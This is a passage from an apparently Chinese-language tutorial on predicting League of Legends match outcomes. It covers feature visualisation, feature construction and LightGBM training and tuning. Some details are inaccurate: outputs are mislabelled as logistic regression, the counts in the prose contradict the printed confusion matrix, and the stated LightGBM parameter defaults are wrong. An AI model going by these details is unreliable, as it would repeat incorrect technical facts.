class="string">&#x27;blueWins&#x27;</span>, var_name=<span class="string">&#x27;Features&#x27;</span>, value_name=<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>,<span class="number">2</span>,figsize=(<span class="number">15</span>,<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制小提琴图</span></span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Features&#x27;</span>, y=<span class="string">&#x27;Values&#x27;</span>, hue=<span class="string">&#x27;blueWins&#x27;</span>, data=data, split=<span class="literal">True</span>,</span><br><span class="line">               inner=<span class="string">&#x27;quart&#x27;</span>, ax=ax[<span class="number">0</span>], palette=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">fig.autofmt_xdate(rotation=<span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">data = x</span><br><span class="line">data_std = (data - data.mean()) / data.std()</span><br><span class="line">data = pd.concat([y, data_std.iloc[:, <span class="number">9</span>:<span class="number">18</span>]], axis=<span class="number">1</span>)</span><br><span class="line">data = pd.melt(data, id_vars=<span class="string">&#x27;blueWins&#x27;</span>, var_name=<span class="string">&#x27;Features&#x27;</span>, value_name=<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制小提琴图</span></span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Features&#x27;</span>, y=<span class="string">&#x27;Values&#x27;</span>, hue=<span class="string">&#x27;blueWins&#x27;</span>, </span><br><span class="line">               data=data, split=<span class="literal">True</span>, inner=<span class="string">&#x27;quart&#x27;</span>, ax=ax[<span class="number">1</span>], palette=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">fig.autofmt_xdate(rotation=<span class="number">45</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_16_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>提琴图 (Violin Plot) 是用来展示多组数据的分布状态以及概率密度。这种图表结合了箱形图和密度图的特征，主要用来显示数据的分布形状。</p><p>从图中我们可以看出：</p><ul><li>击杀英雄数量越多更容易赢，死亡数量越多越容易输（bluekills 与 bluedeaths 左右的区别）。</li><li>助攻数量与击杀英雄数量形成的图形状类似，说明他们对游戏结果的影响差不多。</li><li>一血的取得情况与获胜有正相关，但是相关性不如击杀英雄数量明显。</li><li>经济差与经验差对于游戏胜负的影响较小。</li><li>击杀野怪数量对游戏胜负的影响并不大。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">18</span>,<span class="number">14</span>))</span><br><span class="line">sns.heatmap(<span class="built_in">round</span>(x.corr(),<span class="number">2</span>), cmap=<span class="string">&#x27;Blues&#x27;</span>, annot=<span class="literal">True</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_18_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>同时我们画出各个特征之间的相关性热力图，颜色越深代表特征之间相关性越强，我们剔除那些相关性较强的冗余特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去除冗余特征</span></span><br><span class="line">drop_cols = [<span class="string">&#x27;redAvgLevel&#x27;</span>,<span class="string">&#x27;blueAvgLevel&#x27;</span>]</span><br><span class="line">x.drop(drop_cols, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sns.<span class="built_in">set</span>(style=<span class="string">&#x27;whitegrid&#x27;</span>, palette=<span class="string">&#x27;muted&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造两个新特征</span></span><br><span class="line">x[<span class="string">&#x27;wardsPlacedDiff&#x27;</span>] = x[<span class="string">&#x27;blueWardsPlaced&#x27;</span>] - x[<span class="string">&#x27;redWardsPlaced&#x27;</span>]</span><br><span class="line">x[<span class="string">&#x27;wardsDestroyedDiff&#x27;</span>] = x[<span class="string">&#x27;blueWardsDestroyed&#x27;</span>] - x[<span class="string">&#x27;redWardsDestroyed&#x27;</span>]</span><br><span class="line"></span><br><span class="line">data = x[[<span class="string">&#x27;blueWardsPlaced&#x27;</span>,<span class="string">&#x27;blueWardsDestroyed&#x27;</span>,<span class="string">&#x27;wardsPlacedDiff&#x27;</span>,<span class="string">&#x27;wardsDestroyedDiff&#x27;</span>]].sample(<span class="number">1000</span>)</span><br><span class="line">data_std = (data - data.mean()) / data.std()</span><br><span class="line">data = pd.concat([y, data_std], axis=<span class="number">1</span>)</span><br><span class="line">data = pd.melt(data, id_vars=<span class="string">&#x27;blueWins&#x27;</span>, var_name=<span class="string">&#x27;Features&#x27;</span>, value_name=<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">sns.swarmplot(x=<span class="string">&#x27;Features&#x27;</span>, y=<span class="string">&#x27;Values&#x27;</span>, hue=<span class="string">&#x27;blueWins&#x27;</span>, data=data)</span><br><span class="line">plt.xticks(rotation=<span class="number">45</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.8% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 8.2% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 6.7% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.7% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)</code></pre><p><img "" class="lazyload placeholder" data-original="output_21_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们画出了插眼数量的散点图，发现不存在插眼数量与游戏胜负间的显著规律。猜测由于钻石分段以上在哪插眼在哪好排眼都是套路，所以数据中前十分钟插眼数拔眼数对游戏的影响不大。所以我们暂时先把这些特征去掉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 去除和眼位相关的特征</span></span><br><span class="line">drop_cols = [<span class="string">&#x27;blueWardsPlaced&#x27;</span>,<span class="string">&#x27;blueWardsDestroyed&#x27;</span>,<span class="string">&#x27;wardsPlacedDiff&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;wardsDestroyedDiff&#x27;</span>,<span class="string">&#x27;redWardsPlaced&#x27;</span>,<span class="string">&#x27;redWardsDestroyed&#x27;</span>]</span><br><span class="line">x.drop(drop_cols, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x[<span class="string">&#x27;killsDiff&#x27;</span>] = x[<span class="string">&#x27;blueKills&#x27;</span>] - x[<span class="string">&#x27;blueDeaths&#x27;</span>]</span><br><span class="line">x[<span class="string">&#x27;assistsDiff&#x27;</span>] = x[<span class="string">&#x27;blueAssists&#x27;</span>] - x[<span class="string">&#x27;redAssists&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x[[<span class="string">&#x27;blueKills&#x27;</span>,<span class="string">&#x27;blueDeaths&#x27;</span>,<span class="string">&#x27;blueAssists&#x27;</span>,<span class="string">&#x27;killsDiff&#x27;</span>,<span class="string">&#x27;assistsDiff&#x27;</span>,<span class="string">&#x27;redAssists&#x27;</span>]].hist(figsize=(<span class="number">12</span>,<span class="number">10</span>), bins=<span class="number">20</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\pandas\plotting\_matplotlib\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead.  if ax.is_first_col():</code></pre><p><img "" class="lazyload placeholder" data-original="output_24_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们发现击杀、死亡与助攻数的数据分布差别不大。但是击杀减去死亡、助攻减去死亡的分布与原分布差别很大，因此我们新构造这么两个特征。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = x[[<span class="string">&#x27;blueKills&#x27;</span>,<span class="string">&#x27;blueDeaths&#x27;</span>,<span class="string">&#x27;blueAssists&#x27;</span>,<span class="string">&#x27;killsDiff&#x27;</span>,<span class="string">&#x27;assistsDiff&#x27;</span>,<span class="string">&#x27;redAssists&#x27;</span>]].sample(<span class="number">1000</span>)</span><br><span class="line">data_std = (data - data.mean()) / data.std()</span><br><span class="line">data = pd.concat([y, data_std], axis=<span class="number">1</span>)</span><br><span class="line">data = pd.melt(data, id_vars=<span class="string">&#x27;blueWins&#x27;</span>, var_name=<span class="string">&#x27;Features&#x27;</span>, value_name=<span class="string">&#x27;Values&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">sns.swarmplot(x=<span class="string">&#x27;Features&#x27;</span>, y=<span class="string">&#x27;Values&#x27;</span>, hue=<span class="string">&#x27;blueWins&#x27;</span>, data=data)</span><br><span class="line">plt.xticks(rotation=<span class="number">45</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.9% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 8.0% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.5% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.1% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 6.2% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\seaborn\categorical.py:1296: UserWarning: 7.4% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot.  warnings.warn(msg, UserWarning)</code></pre><p><img "" class="lazyload placeholder" data-original="output_26_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>从上图我们可以发现击杀数与死亡数与助攻数，以及我们构造的特征对数据都有较好的分类能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = pd.concat([y, x], axis=<span class="number">1</span>).sample(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">sns.pairplot(data, <span class="built_in">vars</span>=[<span class="string">&#x27;blueKills&#x27;</span>,<span class="string">&#x27;blueDeaths&#x27;</span>,<span class="string">&#x27;blueAssists&#x27;</span>,<span class="string">&#x27;killsDiff&#x27;</span>,<span class="string">&#x27;assistsDiff&#x27;</span>,<span class="string">&#x27;redAssists&#x27;</span>], </span><br><span class="line">             hue=<span class="string">&#x27;blueWins&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_28_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>一些特征两两组合后对于数据的划分能力也有提升。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">x[<span class="string">&#x27;dragonsDiff&#x27;</span>] = x[<span class="string">&#x27;blueDragons&#x27;</span>] - x[<span class="string">&#x27;redDragons&#x27;</span>]</span><br><span class="line">x[<span class="string">&#x27;heraldsDiff&#x27;</span>] = x[<span class="string">&#x27;blueHeralds&#x27;</span>] - x[<span class="string">&#x27;redHeralds&#x27;</span>]</span><br><span class="line">x[<span class="string">&#x27;eliteDiff&#x27;</span>] = x[<span class="string">&#x27;blueEliteMonsters&#x27;</span>] - x[<span class="string">&#x27;redEliteMonsters&#x27;</span>]</span><br><span class="line"></span><br><span class="line">data = pd.concat([y, x], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">eliteGroup = data.groupby([<span class="string">&#x27;eliteDiff&#x27;</span>])[<span class="string">&#x27;blueWins&#x27;</span>].mean()</span><br><span class="line">dragonGroup = data.groupby([<span class="string">&#x27;dragonsDiff&#x27;</span>])[<span class="string">&#x27;blueWins&#x27;</span>].mean()</span><br><span class="line">heraldGroup = data.groupby([<span class="string">&#x27;heraldsDiff&#x27;</span>])[<span class="string">&#x27;blueWins&#x27;</span>].mean()</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>,<span class="number">3</span>, figsize=(<span class="number">15</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">eliteGroup.plot(kind=<span class="string">&#x27;bar&#x27;</span>, ax=ax[<span class="number">0</span>])</span><br><span class="line">dragonGroup.plot(kind=<span class="string">&#x27;bar&#x27;</span>, ax=ax[<span class="number">1</span>])</span><br><span class="line">heraldGroup.plot(kind=<span class="string">&#x27;bar&#x27;</span>, ax=ax[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(eliteGroup)</span><br><span class="line"><span class="built_in">print</span>(dragonGroup)</span><br><span class="line"><span class="built_in">print</span>(heraldGroup)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\pandas\plotting\_matplotlib\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead.  if ax.is_first_col():eliteDiff-2    0.286301-1    0.368772 0    0.500683 1    0.632093 2    0.735211Name: blueWins, dtype: float64dragonsDiff-1    0.374173 0    0.500000 1    0.640940Name: blueWins, dtype: float64heraldsDiff-1    0.387729 0    0.498680 1    0.595046Name: blueWins, dtype: float64</code></pre><p><img "" class="lazyload placeholder" data-original="output_30_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们构造了两队之间是否拿到龙、是否拿到峡谷先锋、击杀大型野怪的数量差值，发现在游戏的前期拿到龙比拿到峡谷先锋更容易获得胜利。拿到大型野怪的数量和胜率也存在着强相关。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">x[<span class="string">&#x27;towerDiff&#x27;</span>] = x[<span class="string">&#x27;blueTowersDestroyed&#x27;</span>] - x[<span class="string">&#x27;redTowersDestroyed&#x27;</span>]</span><br><span class="line"></span><br><span class="line">data = pd.concat([y, x], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">towerGroup = data.groupby([<span class="string">&#x27;towerDiff&#x27;</span>])[<span class="string">&#x27;blueWins&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(towerGroup.count())</span><br><span class="line"><span class="built_in">print</span>(towerGroup.mean())</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>,<span class="number">2</span>,figsize=(<span class="number">15</span>,<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">towerGroup.mean().plot(kind=<span class="string">&#x27;line&#x27;</span>, ax=ax[<span class="number">0</span>])</span><br><span class="line">ax[<span class="number">0</span>].set_title(<span class="string">&#x27;Proportion of Blue Wins&#x27;</span>)</span><br><span class="line">ax[<span class="number">0</span>].set_ylabel(<span class="string">&#x27;Proportion&#x27;</span>)</span><br><span class="line"></span><br><span class="line">towerGroup.count().plot(kind=<span class="string">&#x27;line&#x27;</span>, ax=ax[<span class="number">1</span>])</span><br><span class="line">ax[<span class="number">1</span>].set_title(<span class="string">&#x27;Count of Towers Destroyed&#x27;</span>)</span><br><span class="line">ax[<span class="number">1</span>].set_ylabel(<span class="string">&#x27;Count&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>towerDiff-2      27-1     347 0    9064 1     406 2      28 3       6 4       1Name: blueWins, dtype: int64towerDiff-2    0.185185-1    0.216138 0    0.498124 1    0.741379 2    0.964286 3    1.000000 4    1.000000Name: blueWins, dtype: float64c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\pandas\plotting\_matplotlib\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead.  if ax.is_first_col():c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\pandas\plotting\_matplotlib\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead.  if ax.is_first_col():Text(0, 0.5, 'Count')</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_32_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>推塔是英雄联盟这个游戏的核心，因此推塔数量可能与游戏的胜负有很大关系。我们绘图发现，尽管前十分钟推掉第一座防御塔的概率很低，但是一旦某只队伍推掉第一座防御塔，获得游戏的胜率将大大增加。</p><p><strong>Step5: 利用 LightGBM 进行训练与预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，在测试集上验证模型性能。</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">## 选择其类别为0和1的样本 （不包括类别为2的样本）</span></span><br><span class="line">data_target_part = y</span><br><span class="line">data_features_part = x</span><br><span class="line"></span><br><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data_features_part, </span><br><span class="line">                                                    data_target_part, </span><br><span class="line">                                                    test_size = <span class="number">0.2</span>, </span><br><span class="line">                                                    random_state = <span class="number">2020</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 导入LightGBM模型</span></span><br><span class="line"><span class="keyword">from</span> lightgbm.sklearn <span class="keyword">import</span> LGBMClassifier</span><br><span class="line"><span class="comment">## 定义 LightGBM 模型 </span></span><br><span class="line">clf = LGBMClassifier()</span><br><span class="line"><span class="comment"># 在训练集上训练LightGBM模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>LGBMClassifier()</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The accuracy of the Logistic Regression is: 0.8447425028470201The accuracy of the Logistic Regression is: 0.722165991902834The confusion matrix result: [[714 300] [249 713]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_37_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们可以发现共有 718 + 707 个样本预测正确，306 + 245 个样本预测错误。</p><p><strong>Step6: 利用 LightGBM 进行特征选择</strong></p><p>LightGBM 的特征选择属于特征选择中的嵌入式方法，在 LightGBM 中可以用属性 feature_importances_去查看特征的重要度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sns.barplot(y=data_features_part.columns, x=clf.feature_importances_)</span><br></pre></td></tr></table></figure><pre><code>&lt;AxesSubplot:&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_40_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>总经济差距等特征，助攻数量、击杀死亡数量等特征都具有很大的作用。插眼数、推塔数对模型的影响并不大。</p><p>初次之外，我们还可以使用 LightGBM 中的下列重要属性来评估特征的重要性。</p><ul><li>gain: 当利用特征做划分的时候的评价基尼指数</li><li>split: 是以特征用到的次数来评价</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> plot_importance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">estimate</span>(<span class="params">model,data</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#sns.barplot(data.columns,model.feature_importances_)</span></span><br><span class="line">    ax1=plot_importance(model,importance_type=<span class="string">&quot;gain&quot;</span>)</span><br><span class="line">    ax1.set_title(<span class="string">&#x27;gain&#x27;</span>)</span><br><span class="line">    ax2=plot_importance(model, importance_type=<span class="string">&quot;split&quot;</span>)</span><br><span class="line">    ax2.set_title(<span class="string">&#x27;split&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">classes</span>(<span class="params">data,label,test</span>):</span></span><br><span class="line">    model=LGBMClassifier()</span><br><span class="line">    model.fit(data,label)</span><br><span class="line">    ans=model.predict(test)</span><br><span class="line">    estimate(model, data)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"> </span><br><span class="line">ans=classes(x_train,y_train,x_test)</span><br><span class="line">pre=accuracy_score(y_test, ans)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;acc=&#x27;</span>,accuracy_score(y_test,ans))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_42_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_42_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><pre><code>acc= 0.722165991902834</code></pre><p>这些图同样可以帮助我们更好的了解其他重要特征。</p><p><strong>Step7: 通过调整参数获得更好的效果</strong></p><p>LightGBM 中包括但不限于下列对模型影响较大的参数：</p><ul><li>learning_rate: 有时也叫作 eta，系统默认值为 0.3。每一步迭代的步长，很重要。太大了运行准确率不高，太小了运行速度慢。</li><li>num_leaves：系统默认为 32。这个参数控制每棵树中最大叶子节点数量。</li><li>feature_fraction：系统默认值为 1。我们一般设置成 0.8 左右。用来控制每棵随机采样的列数的占比 (每一列是一个特征)。</li><li>max_depth： 系统默认值为 6，我们常用 3-10 之间的数字。这个值为树的最大深度。这个值是用来控制过拟合的。max_depth 越大，模型学习的更加具体。</li></ul><p>调节模型参数的方法有贪心算法、网格调参、贝叶斯调参等。这里我们采用网格调参，它的基本思想是穷举搜索：在所有候选的参数选择中，通过循环遍历，尝试每一种可能性，表现最好的参数就是最终的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 